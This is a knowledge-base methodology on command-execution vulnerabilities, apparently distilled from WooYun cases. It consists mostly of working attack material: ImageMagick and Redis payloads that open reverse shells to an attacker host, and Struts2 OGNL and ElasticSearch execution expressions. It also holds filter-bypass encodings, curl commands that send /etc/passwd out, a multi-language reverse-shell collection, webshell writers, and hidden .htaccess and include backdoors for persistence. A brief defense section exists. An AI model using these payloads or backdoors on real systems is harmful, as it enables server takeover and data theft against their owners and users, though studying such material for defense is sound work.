# Command Execution Vulnerability Analysis Methodology

> Distilled from 6,826 cases | Data source: WooYun Vulnerability Database (2010-2016)

## Table of Contents

- [1. Command Execution Entry Point Classification](#1-command-execution-entry-point-classification)
- [2. Command Concatenation Operators](#2-command-concatenation-operators)
- [3. Filter Bypass Techniques](#3-filter-bypass-techniques)
- [4. Blind (No Output) Detection Methods](#4-blind-no-output-detection-methods)
- [5. Common Vulnerable Frameworks/CMS](#5-common-vulnerable-frameworkscms)
- [6. Practical Payload Collection](#6-practical-payload-collection)
- [7. Defense Recommendations](#7-defense-recommendations)
- [8. Detection Methodology](#8-detection-methodology)
- [9. Case Reference Index](#9-case-reference-index)
- [10. PHP Command Execution Meta-Analysis](#10-php-command-execution-meta-analysis)

---

## 1. Command Execution Entry Point Classification

### 1.1 Statistical Overview

| Entry Type | Case Count | Percentage | Typical Scenario |
|-----------|-----------|-----------|-----------------|
| File Operations | 34 | 68% | File upload, read, decompression |
| System Command Functions | 31 | 62% | exec/system/shell_exec |
| Struts2 Framework | 25 | 50% | OGNL Expression Injection |
| Compression/Decompression | 15 | 30% | tar/zip/gzip processing |
| SSRF | 15 | 30% | URL parameter passing |
| ping Command | 13 | 26% | Network diagnostic features |
| Image Processing | 12 | 24% | ImageMagick/GraphicsMagick |
| Network Requests | 12 | 24% | curl/wget invocation |
| Java Deserialization | 10 | 20% | WebLogic/JBoss |
| DNS Queries | 8 | 16% | nslookup/dig |

### 1.2 High-Frequency Entry Points Detailed

#### 1.2.1 ImageMagick Command Execution (CVE-2016-3714)

**Vulnerability Mechanism**: When ImageMagick processes images, the delegate.xml configuration file contains injection points in its commands

**Typical POC**:
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image"|bash -i >& /dev/tcp/ATTACKER_IP/8080 0>&1 &")'
pop graphic-context
```

**Alternative Format**:
```
push graphic-context
viewbox 0 0 640 480
image copy 200,200 100,100 "|bash -i >& /dev/tcp/ATTACKER_IP/53 0>&1"
pop graphic-context
```

**Real-World Cases**:
- WooYun-2016-0205171: Avatar upload on a major social network, directly obtained root shell
- WooYun-2016-0214726: A social media platform, patch bypass
- WooYun-2016-0205815: A mobile app avatar upload

**Exploitation Conditions**:
1. Website uses ImageMagick to process user-uploaded images
2. Version < 6.9.3-10 or 7.x < 7.0.1-1

---

#### 1.2.2 FFmpeg SSRF/File Read

**Vulnerability Mechanism**: When FFmpeg processes HLS playlists, the concat protocol can be used to read local files or initiate SSRF

**Typical POC**:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
concat:https://example.com/payload
#EXT-X-ENDLIST
```

**File Read POC**:
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:,
concat:file:///etc/passwd
#EXT-X-ENDLIST
```

**Real-World Cases**:
- WooYun-2016-0205709: Upload endpoint on a video sharing platform

---

#### 1.2.3 Struts2 OGNL Expression Injection

**Vulnerability Mechanism**: Struts2 framework improperly handles user-supplied OGNL expressions

**S2-045 POC**:
```
Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',123*123)}.multipart/form-data
```

**S2-016/S2-013 redirect/action POC**:
```
redirect:${%23a%3d(new java.lang.ProcessBuilder(new java.lang.String[]{'cat','/etc/passwd'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew java.io.InputStreamReader(%23b),%23d%3dnew java.io.BufferedReader(%23c),%23e%3dnew char[50000],%23d.read(%23e),%23out%3d%23context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),%23out.getWriter().println('dbapp%3A'+new java.lang.String(%23e)),%23out.getWriter().flush(),%23out.getWriter().close()}
```

**Generic Command Execution Expression**:
```
${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[50000],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(#d),#out.close())}
```

**Real-World Cases**:
- WooYun-2015-0122286: A gaming company, Expression language injection
- WooYun-2014-087017: A major video portal, Struts command execution
- WooYun-2015-0164662: A government health system

---

#### 1.2.4 Java Deserialization (WebLogic/JBoss/Jenkins)

**Vulnerability Mechanism**: Maliciously crafted object chains execute during Java deserialization

**WebLogic T3 Protocol Exploitation**:
```bash
java -jar ysoserial.jar CommonsCollections1 "whoami" | nc target 7001
```

**JBoss JMX-Console Exploitation**:
```
# Access /jmx-console to upload WAR packages
# Default credentials: admin/admin
http://target:8080/jmx-console/
```

**Real-World Cases**:
- WooYun-2015-0166055: A major energy corporation, WebLogic root privileges
- WooYun-2015-0163942: An insurance company, WebLogic
- WooYun-2015-0144418: A telecom provider, JBoss

---

#### 1.2.5 ElasticSearch Groovy Script Execution

**Vulnerability Mechanism**: ElasticSearch 1.x versions have dynamic script execution enabled by default

**POC**:
```json
POST /_search?pretty HTTP/1.1
Host: target:9200
Content-Type: application/json

{
  "script_fields": {
    "exp": {
      "script": "java.lang.Runtime.getRuntime().exec('id')"
    }
  }
}
```

**Groovy Sandbox Bypass**:
```json
{
  "size": 1,
  "script_fields": {
    "lupin": {
      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"
    }
  }
}
```

**Real-World Cases**:
- WooYun-2015-099709: A gaming company, multiple ElasticSearch instances

---

#### 1.2.6 ping Command Injection

**Vulnerability Mechanism**: User input is directly concatenated into the ping command

**Typical Vulnerable PHP Code**:
```php
$ip = $_GET['ip'];
system("ping -c 4 " . $ip);
```

**POC**:
```
ip=127.0.0.1;whoami
ip=127.0.0.1|id
ip=127.0.0.1`id`
ip=127.0.0.1$(id)
ip=127.0.0.1%0aid
```

---

## 2. Command Concatenation Operators

### 2.1 Statistical Overview

| Operator | Case Count | Meaning | Execution Logic |
|----------|-----------|---------|----------------|
| `;` | 30 | Command separator | Sequential execution, regardless of previous result |
| `\|` | 14 | Pipe | Previous output feeds into next command |
| `` ` `` | 5 | Command substitution | Executes command within backticks |
| `\|\|` | 5 | Logical OR | Executes next only if previous fails |
| `%0a` | 1 | Newline | URL-encoded newline character |
| `&&` | 1 | Logical AND | Executes next only if previous succeeds |
| `$()` | 1 | Command substitution | Executes command within parentheses |

### 2.2 Operator Details

#### 2.2.1 Semicolon `;`
```bash
# Most common; unaffected by previous command result
ping 127.0.0.1; whoami; id
```

#### 2.2.2 Pipe `|`
```bash
# Previous output feeds into next command
ping 127.0.0.1 | id
# Common variation
ping 127.0.0.1 || id  # Executes next if previous fails
```

#### 2.2.3 Command Substitution
```bash
# Backtick form
ping `whoami`
# $() form
ping $(whoami)
```

#### 2.2.4 Logical Operators
```bash
# && executes next only if previous succeeds
ping 127.0.0.1 && whoami
# || executes next only if previous fails
ping nonexistent.host || whoami
```

#### 2.2.5 Newline Characters
```
# URL-encoded newline
ping%0awhoami
ping%0d%0awhoami
```

---

## 3. Filter Bypass Techniques

### 3.1 Statistical Overview

| Bypass Technique | Case Count | Applicable Scenario |
|-----------------|-----------|-------------------|
| Wildcards | 45 | Filename/command name filtering |
| cat Alternatives | 30 | cat keyword filtering |
| Angle Brackets `<>` | 29 | Space filtering |
| Hex Encoding | 12 | Character filtering |
| URL Encoding | 8 | Web scenarios |
| `%09` Tab | 5 | Space filtering |
| Base64 Encoding | 2 | Complex command delivery |

### 3.2 Space Bypass

#### 3.2.1 `${IFS}` Internal Field Separator
```bash
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
cat${IFS}$9/etc/passwd
```

#### 3.2.2 Tab Character `%09`
```bash
cat%09/etc/passwd
```

#### 3.2.3 Redirect Operators `<>`
```bash
cat</etc/passwd
{cat,/etc/passwd}
```

#### 3.2.4 Brace Expansion
```bash
{cat,/etc/passwd}
{ls,-la,/}
```

### 3.3 Keyword Bypass

#### 3.3.1 Quote Splitting
```bash
c'a't /etc/passwd
c"a"t /etc/passwd
c``at /etc/passwd
```

#### 3.3.2 Backslash Splitting
```bash
c\at /etc/passwd
wh\oami
```

#### 3.3.3 Variable Concatenation
```bash
a=c;b=at;$a$b /etc/passwd
```

#### 3.3.4 Wildcards
```bash
/bin/ca* /etc/passwd
/bin/c?t /etc/passwd
/???/??t /etc/passwd
```

### 3.4 cat Command Alternatives

```bash
# The following commands can all read file contents
tac /etc/passwd      # Reverse output
head /etc/passwd     # Output beginning
tail /etc/passwd     # Output end
more /etc/passwd     # Paged view
less /etc/passwd     # Paged view
nl /etc/passwd       # Output with line numbers
sort /etc/passwd     # Sorted output
uniq /etc/passwd     # Deduplicated output
od -c /etc/passwd    # Octal output
xxd /etc/passwd      # Hexadecimal output
base64 /etc/passwd   # Base64-encoded output
rev /etc/passwd      # Reversed characters
paste /etc/passwd    # Merge files
```

### 3.5 Encoding Bypass

#### 3.5.1 Base64 Encoding
```bash
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
bash -c "$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)"
```

#### 3.5.2 Hex Encoding
```bash
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash
$(printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64")
```

#### 3.5.3 URL Encoding
```
cat%20/etc/passwd
cat%09/etc/passwd
```

### 3.6 Path Bypass

```bash
# Absolute paths
/bin/cat /etc/passwd
/usr/bin/id

# Environment variables
$HOME
$PATH

# Wildcard paths
/???/??t /???/p??s??
```

---

## 4. Blind (No Output) Detection Methods

### 4.1 Statistical Overview

| Detection Method | Case Count | Principle |
|-----------------|-----------|----------|
| HTTP Out-of-Band | 41 | curl/wget sends results |
| DNSLog | 9 | DNS query logging |
| Time Delay | 6 | sleep/ping delay |
| File Write | 2 | Write to web directory |

### 4.2 DNSLog Out-of-Band

**Common Platforms**:
- ceye.io
- dnslog.example (or similar: Burp Collaborator, interactsh, etc.)
- Burp Collaborator

**POC**:
```bash
# Basic out-of-band
ping `whoami`.xxxxx.ceye.io

# Out-of-band with data
curl http://`whoami`.xxxxx.ceye.io

# Full data exfiltration
curl https://example.com/log?data=`cat /etc/passwd | base64 | tr '\n' '-'`
```

### 4.3 HTTP Out-of-Band

**curl Method**:
```bash
# GET request with data
curl https://example.com/log?data=`whoami`
curl https://example.com/log?data=`cat /etc/passwd | base64`

# POST request
curl -X POST -d "data=$(cat /etc/passwd)" https://example.com/collect
```

**wget Method**:
```bash
wget https://example.com/log?data=`whoami`
```

### 4.4 Time Delay Detection

```bash
# sleep command
sleep 5

# ping delay
ping -c 5 127.0.0.1

# Conditional delay
if [ $(whoami) = "root" ]; then sleep 5; fi
```

### 4.5 File Write Detection

```bash
# Write to web directory
echo "<?php phpinfo();?>" > /var/www/html/info.php

# Write to temporary file
id > /tmp/result.txt
cat /tmp/result.txt

# Append write
id >> /var/www/html/log.txt
```

---

## 5. Common Vulnerable Frameworks/CMS

### 5.1 Statistical Overview

| Framework/CMS | Case Count | Primary Vulnerability Type |
|--------------|-----------|--------------------------|
| Struts2 | 23 | OGNL Expression Injection |
| JBoss | 9 | Deserialization/JMX |
| Tomcat | 9 | PUT Upload/AJP |
| ElasticSearch | 8 | Groovy Script Execution |
| Discuz | 7 | Code Execution/SSRF |
| phpMyAdmin | 6 | SQL to Command Execution |
| WebLogic | 5 | Deserialization |
| Redis | 4 | Unauthorized Access/File Write |
| Spring | 4 | SpEL Injection |
| Zabbix | 2 | Command Execution |
| Nagios | 2 | Command Execution |
| ThinkPHP | 1 | Code Execution |

### 5.2 Framework Vulnerability Details

#### 5.2.1 Struts2 Vulnerability Series

| CVE ID | Vulnerability Name | Affected Versions |
|--------|-------------------|-------------------|
| S2-001 | OGNL Injection | 2.0.0-2.0.8 |
| S2-005 | OGNL Injection | 2.0.0-2.0.11.2 |
| S2-009 | OGNL Injection | 2.1.0-2.3.1.1 |
| S2-013 | URL Redirect | 2.0.0-2.3.14.1 |
| S2-016 | redirect/action | 2.0.0-2.3.15 |
| S2-019 | Dynamic Method Invocation | 2.0.0-2.3.15.1 |
| S2-032 | Dynamic Method Invocation | 2.3.20-2.3.28 |
| S2-045 | Content-Type | 2.3.5-2.3.31 |
| S2-046 | Content-Disposition | 2.3.5-2.3.31 |
| S2-048 | Struts1 Plugin | 2.3.x with Struts1 |
| S2-052 | REST Plugin | 2.1.2-2.3.33 |
| S2-053 | Freemarker | 2.0.1-2.3.33 |
| S2-057 | namespace | 2.0.4-2.3.34 |

#### 5.2.2 WebLogic Deserialization

**Affected Versions**:
- 10.3.6.0
- 12.1.3.0
- 12.2.1.2
- 12.2.1.3

**Vulnerable Port**: 7001 (T3 protocol)

**Detection Method**:
```bash
nmap -p 7001 --script=weblogic-t3-info target
```

#### 5.2.3 JBoss Vulnerabilities

**Common Vulnerability Entry Points**:
- /jmx-console (default admin/admin)
- /invoker/JMXInvokerServlet
- /invoker/EJBInvokerServlet

**Exploitation Methods**:
1. Upload WAR packages to deploy webshells
2. Deserialization-based command execution

#### 5.2.4 Redis Unauthorized Access

**Exploitation Conditions**:
- Redis has no password set
- Redis port (6379) is accessible

**Write SSH Public Key**:
```bash
redis-cli -h target
config set dir /root/.ssh
config set dbfilename authorized_keys
set x "\n\nssh-rsa AAAA...\n\n"
save
```

**Write Crontab**:
```bash
config set dir /var/spool/cron
config set dbfilename root
set x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/attacker/8080 0>&1\n\n"
save
```

---

## 6. Practical Payload Collection

### 6.1 Reverse Shell

#### Bash
```bash
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'
```

#### Python
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
```

#### Perl
```bash
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### PHP
```bash
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat
```bash
nc -e /bin/sh ATTACKER_IP PORT
nc ATTACKER_IP PORT -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP PORT >/tmp/f
```

### 6.2 Write Webshell

#### PHP One-Liner Webshell
```bash
echo '<?php @eval($_POST["pass"]);?>' > /var/www/html/shell.php
```

#### JSP Webshell
```bash
echo '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > shell.jsp
```

### 6.3 Information Gathering

```bash
# System information
uname -a
cat /etc/issue
cat /etc/*-release

# User information
id
whoami
cat /etc/passwd
cat /etc/shadow

# Network information
ifconfig
ip addr
netstat -antlp
ss -antlp

# Process information
ps aux
ps -ef

# Scheduled tasks
crontab -l
cat /etc/crontab
ls -la /etc/cron.*
```

---

## 7. Defense Recommendations

### 7.1 Input Validation

1. **Allowlist validation**: Only permit specific characters (e.g., IP addresses only allow digits and dots)
2. **Type validation**: Ensure input matches the expected data type
3. **Length restriction**: Limit input length to prevent injection

### 7.2 Command Execution Protection

1. **Avoid direct execution**: Use language built-in functions instead of system commands
2. **Parameterized execution**: Use array arguments instead of string concatenation
3. **Escape special characters**: escapeshellarg() / escapeshellcmd()

**PHP Secure Example**:
```php
// Dangerous approach
system("ping " . $_GET['ip']);

// Safer approach
$ip = escapeshellarg($_GET['ip']);
system("ping " . $ip);

// Safest: allowlist validation
if (filter_var($_GET['ip'], FILTER_VALIDATE_IP)) {
    system("ping " . escapeshellarg($_GET['ip']));
}
```

### 7.3 Framework/Component Updates

1. Promptly update Struts2, WebLogic, and other frameworks
2. Disable unnecessary features (e.g., Struts2 dynamic method invocation)
3. Configure security policies (e.g., disable scripting in ElasticSearch)

### 7.4 Principle of Least Privilege

1. Run web services with low-privilege users
2. Restrict permissions for command execution users
3. Use chroot/container isolation

---

## 8. Detection Methodology

### 8.1 Vulnerability Discovery Flow

```
1. Identify Entry Points
   - Search features (ping/nslookup)
   - File operations (upload/download/compression)
   - Image processing
   - Framework fingerprinting

2. Determine Execution Environment
   - Linux/Windows
   - Output present or blind
   - Filter rule probing

3. Construct Payloads
   - Basic payload testing
   - Bypass technique combinations
   - Out-of-band data verification

4. Validate Exploitation
   - Information gathering
   - Reverse shell
   - Persistence
```

### 8.2 Automated Detection Key Points

1. **Identify frameworks**: Struts2 (.action/.do), ThinkPHP, Spring, etc.
2. **Parameter testing**: All user-controllable parameters should be tested
3. **Time-based blind injection**: Use sleep to verify when no output is available
4. **Out-of-band verification**: Confirm execution via DNSLog/HTTP requests

---

## 9. Case Reference Index

| Vulnerability Type | WooYun ID | Key Characteristics |
|-------------------|-----------|-------------------|
| WebLogic Deserialization | WooYun-2015-0166055 | T3 Protocol |
| JBoss Deserialization | WooYun-2015-0144418 | JMX-Console |
| Struts2 OGNL | WooYun-2015-0122286 | Expression Injection |
| ImageMagick | WooYun-2016-0205171 | Image Upload |
| FFmpeg | WooYun-2016-0205709 | Video Upload |
| ElasticSearch | WooYun-2015-099709 | Groovy Script |
| ThinkPHP | WooYun-2015-0141195 | Command Injection |
| CGI Command Execution | WooYun-2015-0155792 | Shellshock |
| Firewall Backdoor | WooYun-2016-0180305 | Code Audit |

---

> Last updated: Based on WooYun vulnerability database analysis
> Analysis tools: Python + JSON parsing
> Sample size: 6,826 command execution vulnerabilities, in-depth analysis of 50 high-quality cases

---

## 10. PHP Command Execution Meta-Analysis

> Distilled from WooYun PHP command execution cases. Focus: WooYun-specific patterns and frequencies.

### 10.1 Dangerous Function Taxonomy

Functions observed across WooYun PHP command execution cases, ranked by frequency:

| Level | Functions | WooYun Frequency | Risk |
|-------|----------|-----------------|------|
| **L1-Code** | eval(), assert(), create_function(), preg_replace /e | Most common entry point | Critical |
| **L2-Shell** | system(), passthru(), shell_exec() | Frequent in ping/network features | High |
| **L3-Process** | exec(), popen(), proc_open() | Moderate | Medium |
| **L4-Callback** | call_user_func*, array_map() | Seen in framework exploits | Low |

**Exploit chain complexity observed in WooYun cases:**

| Complexity | Pattern | WooYun Example |
|-----------|---------|---------------|
| C1-Direct | Parameter -> Dangerous function | eval($_GET['x']) |
| C2-Propagation | Parameter -> Variable -> Function | $code=$_GET['x']; eval($code) |
| C3-Hybrid | Multiple params combined | Template engine / framework vulns |
| C4-Logic | Conditional trigger | Deserialization / scheduled tasks |

### 10.2 WooYun Case: eval() Direct Execution

**WooYun-2015-0116254** - A CMS system command execution via eval():

```php
// Vulnerable code (simulated from case)
public function executeCode() {
    $code = $_POST['code'];
    eval($code);  // No sanitization
}

// Exploitation
POST /index.php?m=Index&a=executeCode
code=system('whoami');

// Persistence
code=file_put_contents('/var/www/html/shell.php','<?php @eval($_POST[x]);?>');
```

**Root cause**: POST parameter flows directly to eval() with no intermediate sanitization. Method name (`executeCode`) itself hints at the functionality.

### 10.3 Persistence Techniques (WooYun-Specific)

These techniques appeared repeatedly in WooYun cases for maintaining access:

**chr()-encoded webshells** (bypasses keyword detection):
```php
$func = 'file_' . 'put_' . 'contents';
$file = '/var/www/html/.config.php';
$data = chr(60).chr(63).chr(112).chr(104).chr(112).chr(32); // <?php
$func($file,$data);
```

**.htaccess backdoor**:
```php
file_put_contents('/var/www/html/.htaccess','ErrorDocument 404 "/eval.php"');
```

**Auto-include variant**:
```php
file_put_contents('/var/www/html/index.php','<?php include(".config.jpg");?>');
file_put_contents('/var/www/html/.config.jpg','<?php @eval($_POST[x]);?>');
```

### 10.4 disable_functions Bypass (Summary)

Multiple WooYun cases demonstrated bypass of PHP `disable_functions`. Common techniques observed (briefly -- these are well-documented elsewhere):

| Technique | Mechanism | Key Requirement |
|-----------|-----------|----------------|
| LD_PRELOAD | Hijack library via mail()/error_log() | Writable dir + gcc or upload .so |
| Shellshock | CVE-2014-6271 env var injection | Bash <= 4.3 |
| Mod_CGI | .htaccess enables CGI execution | Apache + AllowOverride |
| PHP-FPM/FastCGI | Direct FastCGI protocol communication | Access to port 9000 or socket |
| ImageMagick | Delegate command injection | ImageMagick processing present |
| COM components | WScript.Shell on Windows | Windows + COM extension enabled |
| proc_open/pcntl_exec | Alternative process functions | Not in disable_functions list |

### 10.5 WAF Bypass Patterns from WooYun Cases

**Encoding obfuscation seen in cases:**

| Encoding | Example |
|----------|---------|
| Base64 | `base64_decode('c3lzdGVt')` |
| Hex/chr() | `chr(101).chr(118).chr(97).chr(108)` |
| ROT13 | `str_rot13('flfgrz')` -> `system` |
| String concat | `$func = 'sys' . 'tem'; $func('whoami');` |
| Comments | `sys/*x*/tem('whoami');` |
| Reversal | `strrev('metsys')('whoami');` |

### 10.6 Common Vulnerability Locations

From WooYun case analysis:

| Location Type | Typical Scenario | Risk Level |
|--------------|-----------------|------------|
| Template Engine | Template cache/compilation | Critical |
| Cache System | Cache key/value | Critical |
| Dynamic Functions | __call()/__invoke() | High |
| Configuration Files | Dynamic config loading | High |
| Hook System | Callback function registration | High |
| Routing System | Dynamic route resolution | Medium |
| Internationalization | Language pack loading | Medium |

---

> **Knowledge Base Update Log**
> - 2026-01-23: Added PHP Command Execution Meta-Analysis Methodology (Section 10)
> - Based on case: WooYun-2015-0116254 (eval() direct execution)
> - New content: Dangerous function classification matrix, complete test payloads, disable_functions bypass techniques
> - Risk level: Critical (can obtain complete server control)
